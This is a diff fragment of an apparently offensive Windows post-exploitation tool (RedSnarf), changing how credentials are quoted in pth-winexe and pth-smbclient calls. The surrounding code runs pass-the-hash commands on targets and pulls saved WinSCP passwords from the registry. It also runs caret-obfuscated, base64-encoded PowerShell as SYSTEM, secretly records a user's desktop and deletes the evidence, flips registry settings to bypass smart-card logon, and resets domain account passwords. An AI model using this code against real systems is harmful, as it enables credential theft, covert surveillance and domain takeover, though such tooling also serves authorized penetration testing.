-			proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall \/\/"+targets[0]+" 'cmd /C reg.exe query \"HKCU\Software\Martin Prikryl\WinSCP 2\Sessions\" ' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
+			proc = subprocess.Popen("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall \/\/"+targets[0]+" 'cmd /C reg.exe query \"HKCU\Software\Martin Prikryl\WinSCP 2\Sessions\" ' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
 			scp_sessions = proc.communicate()[0]
 						
 			if "The system was unable to find the specified registry key or value." in scp_sessions or len(scp_sessions)==0:
@@ -3719,13 +3719,13 @@ if win_scp!='n':
 				if response=="q":
 					sys.exit()
 
-				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall \/\/"+targets[0]+" 'cmd /C reg.exe query \"HKCU\Software\Martin Prikryl\WinSCP 2\Sessions\\"+num_sessions[int(response)]+"\""" /v \"HostName\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
+				proc = subprocess.Popen("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall \/\/"+targets[0]+" 'cmd /C reg.exe query \"HKCU\Software\Martin Prikryl\WinSCP 2\Sessions\\"+num_sessions[int(response)]+"\""" /v \"HostName\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
 				scp_host = proc.communicate()[0]	
 			
-				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall \/\/"+targets[0]+" 'cmd /C reg.exe query \"HKCU\Software\Martin Prikryl\WinSCP 2\Sessions\\"+num_sessions[int(response)]+"\""" /v \"Username\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
+				proc = subprocess.Popen("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall \/\/"+targets[0]+" 'cmd /C reg.exe query \"HKCU\Software\Martin Prikryl\WinSCP 2\Sessions\\"+num_sessions[int(response)]+"\""" /v \"Username\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
 				scp_username = proc.communicate()[0]	
 
-				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall \/\/"+targets[0]+" 'cmd /C reg.exe query \"HKCU\Software\Martin Prikryl\WinSCP 2\Sessions\\"+num_sessions[int(response)]+"\""" /v \"Password\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
+				proc = subprocess.Popen("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall \/\/"+targets[0]+" 'cmd /C reg.exe query \"HKCU\Software\Martin Prikryl\WinSCP 2\Sessions\\"+num_sessions[int(response)]+"\""" /v \"Password\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
 				scp_password = proc.communicate()[0]	
 
 				if len(scp_host) and len(scp_username) and len(scp_password)==4:
@@ -3902,7 +3902,7 @@ if wifi_credentials in yesanswers:
 
 			en = b64encode(line.encode('UTF-16LE'))						
 						
-			proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" \"cmd /c echo . | pow^eRSheLL^.eX^e -NonI -NoP -ExecutionPolicy ByPass -E "+en+"\" 2>/dev/null", stdout=subprocess.PIPE,shell=True)
+			proc = subprocess.Popen("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall --system \/\/"+targets[0]+" \"cmd /c echo . | pow^eRSheLL^.eX^e -NonI -NoP -ExecutionPolicy ByPass -E "+en+"\" 2>/dev/null", stdout=subprocess.PIPE,shell=True)
 			stdout_value = proc.communicate()[0]
 			print stdout_value
 
@@ -3914,7 +3914,7 @@ if wifi_credentials in yesanswers:
 
 			en = b64encode(line.encode('UTF-16LE'))						
 						
-			proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" \"cmd /c echo . | pow^eRSheLL^.eX^e -NonI -NoP -ExecutionPolicy ByPass -E "+en+"\" 2>/dev/null", stdout=subprocess.PIPE,shell=True)
+			proc = subprocess.Popen("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall --system \/\/"+targets[0]+" \"cmd /c echo . | pow^eRSheLL^.eX^e -NonI -NoP -ExecutionPolicy ByPass -E "+en+"\" 2>/dev/null", stdout=subprocess.PIPE,shell=True)
 			stdout_value = proc.communicate()[0]
 			print stdout_value
 
@@ -3970,7 +3970,7 @@ if recorddesktop in yesanswers:
 		try:			
 			print colored("[+]Starting Screen Recording:\n",'green')
 			
-			os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" \"cmd.exe /C query user \" 2>/dev/null")
+			os.system("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall --system \/\/"+targets[0]+" \"cmd.exe /C query user \" 2>/dev/null")
 
 			usr_response = raw_input("\nPlease enter the username whose desktop you wish to record : ")
 			if usr_response !="":
@@ -3980,8 +3980,8 @@ if recorddesktop in yesanswers:
 				fout.write('SchTasks /run /TN "RedSnarf_ScreenRecord" \n')
 				fout.close() 
 					
-				proc = subprocess.Popen("/usr/bin/pth-smbclient //"+targets[0]+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd /tmp; put srecordstart.bat\' 2>/dev/null", stdout=subprocess.PIPE,shell=True)	
-				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --system --uninstall \/\/"+targets[0]+" \"c:\\srecordstart.bat \" 2>/dev/null", stdout=subprocess.PIPE,shell=True)	
+				proc = subprocess.Popen("/usr/bin/pth-smbclient //"+targets[0]+"/c$ -W "+domain_name+" -U \'"+user+"%"+passw+"\' -c 'lcd /tmp; put srecordstart.bat\' 2>/dev/null", stdout=subprocess.PIPE,shell=True)	
+				proc = subprocess.Popen("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --system --uninstall \/\/"+targets[0]+" \"c:\\srecordstart.bat \" 2>/dev/null", stdout=subprocess.PIPE,shell=True)	
 				print proc.communicate()[0]
 				
 			response = raw_input("\nEnter Y to stop recording : ")
@@ -3992,11 +3992,11 @@ if recorddesktop in yesanswers:
 				fout.write('SchTasks /run /TN "RedSnarf_ScreenRecordStop" \n')
 				fout.close() 
 					
-				proc = subprocess.Popen("/usr/bin/pth-smbclient //"+targets[0]+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd /tmp; put srecordstop.bat\' 2>/dev/null", stdout=subprocess.PIPE,shell=True)	
-				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --system --uninstall \/\/"+targets[0]+" \"c:\\srecordstop.bat \" 2>/dev/null", stdout=subprocess.PIPE,shell=True)	
+				proc = subprocess.Popen("/usr/bin/pth-smbclient //"+targets[0]+"/c$ -W "+domain_name+" -U \'"+user+"%"+passw+"\' -c 'lcd /tmp; put srecordstop.bat\' 2>/dev/null", stdout=subprocess.PIPE,shell=True)	
+				proc = subprocess.Popen("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --system --uninstall \/\/"+targets[0]+" \"c:\\srecordstop.bat \" 2>/dev/null", stdout=subprocess.PIPE,shell=True)	
 				print proc.communicate()[0]
 
-				proc = subprocess.Popen("/usr/bin/pth-smbclient //"+targets[0]+"/c$ --directory windows/temp -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+outputpath+targets[0]+"; get OUTPUT.zip"+"\' 2>/dev/null", stdout=subprocess.PIPE,shell=True)	
+				proc = subprocess.Popen("/usr/bin/pth-smbclient //"+targets[0]+"/c$ --directory windows/temp -W "+domain_name+" -U \'"+user+"%"+passw+"\' -c 'lcd "+outputpath+targets[0]+"; get OUTPUT.zip"+"\' 2>/dev/null", stdout=subprocess.PIPE,shell=True)	
 				print proc.communicate()[0]
 					
 				if os.path.isfile(outputpath+targets[0]+"/"+"OUTPUT.zip"):
@@ -4005,9 +4005,9 @@ if recorddesktop in yesanswers:
 				else:
 					print colored("[-]Recording not found, try again..",'red')
 
-				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" \"cmd.exe /C del c:\\windows\\temp\\"+"OUTPUT.zip\" 2>/dev/null", stdout=subprocess.PIPE,shell=True)	
+				proc = subprocess.Popen("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall --system \/\/"+targets[0]+" \"cmd.exe /C del c:\\windows\\temp\\"+"OUTPUT.zip\" 2>/dev/null", stdout=subprocess.PIPE,shell=True)	
 				print proc.communicate()[0]
-				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" \"cmd.exe /C del c:\\srecordstart.bat c:\\srecordstop.bat\" 2>/dev/null", stdout=subprocess.PIPE,shell=True)	
+				proc = subprocess.Popen("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall --system \/\/"+targets[0]+" \"cmd.exe /C del c:\\srecordstart.bat c:\\srecordstop.bat\" 2>/dev/null", stdout=subprocess.PIPE,shell=True)	
 				print proc.communicate()[0]
 			
 				time.sleep(4)
@@ -4017,11 +4017,11 @@ if recorddesktop in yesanswers:
 				fout.write('SchTasks /delete /TN "RedSnarf_ScreenRecordStop" /f')
 				fout.close() 
 
-				proc = subprocess.Popen("/usr/bin/pth-smbclient //"+targets[0]+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd /tmp; put srecordtidyup.bat\' 2>/dev/null", stdout=subprocess.PIPE,shell=True)	
+				proc = subprocess.Popen("/usr/bin/pth-smbclient //"+targets[0]+"/c$ -W "+domain_name+" -U \'"+user+"%"+passw+"\' -c 'lcd /tmp; put srecordtidyup.bat\' 2>/dev/null", stdout=subprocess.PIPE,shell=True)	
 				print proc.communicate()[0]
-				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --system --uninstall \/\/"+targets[0]+" \"c:\\srecordtidyup.bat \" 2>/dev/null", stdout=subprocess.PIPE,shell=True)
+				proc = subprocess.Popen("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --system --uninstall \/\/"+targets[0]+" \"c:\\srecordtidyup.bat \" 2>/dev/null", stdout=subprocess.PIPE,shell=True)
 				print proc.communicate()[0]					
-				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" \"cmd.exe /C del c:\\srecordtidyup.bat\" 2>/dev/null", stdout=subprocess.PIPE,shell=True)	
+				proc = subprocess.Popen("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall --system \/\/"+targets[0]+" \"cmd.exe /C del c:\\srecordtidyup.bat\" 2>/dev/null", stdout=subprocess.PIPE,shell=True)	
 				print proc.communicate()[0]
 
 				time.sleep(4)
@@ -4159,11 +4159,11 @@ if edq_scforceoption!='n':
 				print colored("\n[+]IMPORTANT - Leave SCforceoption in the state that you found it\n\n",'red')
 
 				print colored("[+]Enabling SCforceoption:",'green')
-				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"ADD\" \"HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\" /v \"scforceoption\" /t REG_DWORD /f /D 1' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
+				proc = subprocess.Popen("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"ADD\" \"HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\" /v \"scforceoption\" /t REG_DWORD /f /D 1' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
 				print proc.communicate()[0]
 
 				print colored("[+]Querying the status of SCforceoption:",'green')
-				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\" /v \"scforceoption\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
+				proc = subprocess.Popen("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\" /v \"scforceoption\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
 				print proc.communicate()[0]
 
 				#Check to see if it's a DC
@@ -4179,7 +4179,7 @@ if edq_scforceoption!='n':
 						line=line+"Set-ADUser "+response+" -SmartcardLogonRequired $true\n"
 					
 						en = b64encode(line.encode('UTF-16LE'))						
-						os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" \"cmd /c echo . | pow^eRSheLL^.eX^e -NonI -NoP -ExecutionPolicy ByPass -E "+en+"\" 2>/dev/null")
+						os.system("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall --system \/\/"+targets[0]+" \"cmd /c echo . | pow^eRSheLL^.eX^e -NonI -NoP -ExecutionPolicy ByPass -E "+en+"\" 2>/dev/null")
 						print colored("[+]Task Completed for account - ",'green')+colored(response,'blue')		
 				
 				sys.exit()	
@@ -4188,11 +4188,11 @@ if edq_scforceoption!='n':
 				print colored("\n[+]IMPORTANT - Leave SCforceoption in the state that you found it\n\n",'red')
 								
 				print colored("[+]Disabling SCforceoption:",'green')
-				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"ADD\" \"HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\" /v \"scforceoption\" /t REG_DWORD /f /D 0' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
+				proc = subprocess.Popen("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"ADD\" \"HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\" /v \"scforceoption\" /t REG_DWORD /f /D 0' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
 				print proc.communicate()[0]
 
 				print colored("[+]Querying the status of SCforceoption:",'green')
-				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\" /v \"scforceoption\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
+				proc = subprocess.Popen("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\" /v \"scforceoption\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
 				print proc.communicate()[0]
 
 				#Check to see if it's a DC
@@ -4209,7 +4209,7 @@ if edq_scforceoption!='n':
 						line=line+"Set-ADAccountPassword -Reset -NewPassword (ConvertTo-SecureString -AsPlainText \""+newpass+"\" -Force) -Identity "+response+"\n"
 
 						en = b64encode(line.encode('UTF-16LE'))						
-						os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" \"cmd /c echo . | pow^eRSheLL^.eX^e -NonI -NoP -ExecutionPolicy ByPass -E "+en+"\" 2>/dev/null")
+						os.system("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall --system \/\/"+targets[0]+" \"cmd /c echo . | pow^eRSheLL^.eX^e -NonI -NoP -ExecutionPolicy ByPass -E "+en+"\" 2>/dev/null")
 						print colored("[+]Task Completed for account - ",'green')+colored(response,'blue')	
 						print colored("[+]Password for account ",'green')+colored(response,'blue')+colored(" has been changed to ",'green')+colored(newpass,'blue')
 
@@ -4218,7 +4218,7 @@ if edq_scforceoption!='n':
 			elif edq_scforceoption.upper()=='Q':
 				print colored("\n[+]INFO - Disabling this setting can be used to bypass Smart Card Logon\n\n",'red')
 				print colored("[+]Querying the status of SCforceoption:",'green')
-				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\" /v \"scforceoption\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
+				proc = subprocess.Popen("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\" /v \"scforceoption\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
 				print proc.communicate()[0]
 				
 				sys.exit()
@@ -4243,11 +4243,11 @@ if edq_SingleSessionPerUser!='n':
 				print colored("\n[+]IMPORTANT - Leave SingleSessionPerUser in the state that you found it\n\n",'red')
 
 				print colored("[+]Enabling SingleSessionPerUser:",'green')
-				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"ADD\" \"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\" /v \"fSingleSessionPerUser\" /t REG_DWORD /f /D 1' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
+				proc = subprocess.Popen("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"ADD\" \"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\" /v \"fSingleSessionPerUser\" /t REG_DWORD /f /D 1' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
 				print proc.communicate()[0]
 
 				print colored("[+]Querying the status of SingleSessionPerUser:",'green')
-				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\" /v \"fSingleSessionPerUser\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
+				proc = subprocess.Popen("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\" /v \"fSingleSessionPerUser\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
 				print proc.communicate()[0]
 				
 				sys.exit()	
@@ -4256,18 +4256,18 @@ if edq_SingleSessionPerUser!='n':
 				print colored("\n[+]IMPORTANT - Leave SingleSessionPerUser in the state that you found it\n\n",'red')
 				
 				print colored("[+]Disabling SingleSessionPerUser:",'green')
-				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"ADD\" \"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\" /v \"fSingleSessionPerUser\" /t REG_DWORD /f /D 0' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
+				proc = subprocess.Popen("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"ADD\" \"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\" /v \"fSingleSessionPerUser\" /t REG_DWORD /f /D 0' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
 				print proc.communicate()[0]
 
 				print colored("[+]Querying the status of SingleSessionPerUser:",'green')
-				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\" /v \"fSingleSessionPerUser\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
+				proc = subprocess.Popen("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\" /v \"fSingleSessionPerUser\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
 				print proc.communicate()[0]
 
 				sys.exit()	
 	
 			elif edq_SingleSessionPerUser.upper()=='Q':
 				print colored("[+]Querying the status of SingleSessionPerUser:",'green')
-				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\" /v \"fSingleSessionPerUser\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
+				proc = subprocess.Popen("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\" /v \"fSingleSessionPerUser\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
 				print proc.communicate()[0]
 				
 				sys.exit()	
@@ -4292,11 +4292,11 @@ if edq_allowtgtsessionkey!='n':
 				print colored("\n[+]IMPORTANT - Leave allowtgtsessionkey in the state that you found it\n\n",'red')
 
 				print colored("[+]Enabling allowtgtsessionkey:",'green')
-				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"ADD\" \"HKLM\System\CurrentControlSet\Control\Lsa\Kerberos\Parameters\" /v \"allowtgtsessionkey\" /t REG_DWORD /f /D 1' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
+				proc = subprocess.Popen("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"ADD\" \"HKLM\System\CurrentControlSet\Control\Lsa\Kerberos\Parameters\" /v \"allowtgtsessionkey\" /t REG_DWORD /f /D 1' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
 				print proc.communicate()[0]
 
 				print colored("[+]Querying the status of allowtgtsessionkey:",'green')
-				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\System\CurrentControlSet\Control\Lsa\Kerberos\Parameters\" /v \"allowtgtsessionkey\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
+				proc = subprocess.Popen("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\System\CurrentControlSet\Control\Lsa\Kerberos\Parameters\" /v \"allowtgtsessionkey\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
 				print proc.communicate()[0]
 				
 				sys.exit()	
@@ -4305,18 +4305,18 @@ if edq_allowtgtsessionkey!='n':
 				print colored("\n[+]IMPORTANT - Leave allowtgtsessionkey in the state that you found it\n\n",'red')
 				
 				print colored("[+]Disabling allowtgtsessionkey:",'green')
-				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"ADD\" \"HKLM\System\CurrentControlSet\Control\Lsa\Kerberos\Parameters\" /v \"allowtgtsessionkey\" /t REG_DWORD /f /D 0' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
+				proc = subprocess.Popen("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"ADD\" \"HKLM\System\CurrentControlSet\Control\Lsa\Kerberos\Parameters\" /v \"allowtgtsessionkey\" /t REG_DWORD /f /D 0' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
 				print proc.communicate()[0]
 
 				print colored("[+]Querying the status of allowtgtsessionkey:",'green')
-				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\System\CurrentControlSet\Control\Lsa\Kerberos\Parameters\" /v \"allowtgtsessionkey\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
+				proc = subprocess.Popen("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\System\CurrentControlSet\Control\Lsa\Kerberos\Parameters\" /v \"allowtgtsessionkey\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
 				print proc.communicate()[0]
 
 				sys.exit()	
 	
 			elif edq_allowtgtsessionkey.upper()=='Q':
 				print colored("[+]Querying the status of allowtgtsessionkey:",'green')
-				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\System\CurrentControlSet\Control\Lsa\Kerberos\Parameters\" /v \"allowtgtsessionkey\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
+				proc = subprocess.Popen("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\System\CurrentControlSet\Control\Lsa\Kerberos\Parameters\" /v \"allowtgtsessionkey\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
 				print proc.communicate()[0]
 				
 				sys.exit()
@@ -4341,11 +4341,11 @@ if edq_autologon!='n':
 				print colored("\n[+]IMPORTANT - Leave AutoLogon in the state that you found it\n\n",'red')
 
 				print colored("[+]Enabling AutoLogon:",'green')
-				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"ADD\" \"HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon\" /v \"AutoAdminLogon\" /t REG_DWORD /f /D 1' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
+				proc = subprocess.Popen("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"ADD\" \"HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon\" /v \"AutoAdminLogon\" /t REG_DWORD /f /D 1' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
 				print proc.communicate()[0]
 
 				print colored("[+]Querying the status of AutoLogon:",'green')
-				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon\" /v \"AutoAdminLogon\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
+				proc = subprocess.Popen("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon\" /v \"AutoAdminLogon\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
 				print proc.communicate()[0]
 				
 				sys.exit()	
@@ -4354,30 +4354,30 @@ if edq_autologon!='n':
 				print colored("\n[+]IMPORTANT - Leave AutoLogon in the state that you found it\n\n",'red')
 				
 				print colored("[+]Disabling AutoLogon:",'green')
-				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"ADD\" \"HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon\" /v \"AutoAdminLogon\" /t REG_DWORD /f /D 0' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
+				proc = subprocess.Popen("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"ADD\" \"HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon\" /v \"AutoAdminLogon\" /t REG_DWORD /f /D 0' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
 				print proc.communicate()[0]
 
 				print colored("[+]Querying the status of AutoLogon:",'green')
